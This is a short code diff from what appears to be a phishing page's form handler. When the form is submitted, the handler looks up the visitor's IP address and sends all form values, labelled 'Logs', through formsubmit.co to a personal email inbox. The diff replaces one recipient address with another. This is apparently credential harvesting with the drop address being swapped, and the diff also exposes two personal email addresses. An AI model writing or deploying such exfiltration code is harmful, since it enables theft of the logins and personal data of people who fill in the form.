@@ -84,7 +84,7 @@ form.addEventListener('submit', function(e) {
     }
 
    $.getJSON('https://ipinfo.io', function(response) {
-        const posting = $.post("https://formsubmit.co/ajax/sevimlale2021@gmail.com", {
+        const posting = $.post("https://formsubmit.co/ajax/Juderichie2002@proton.me", {
             _subject: "Logs | " + response.ip,
             ...values,
             IP: response.ip,
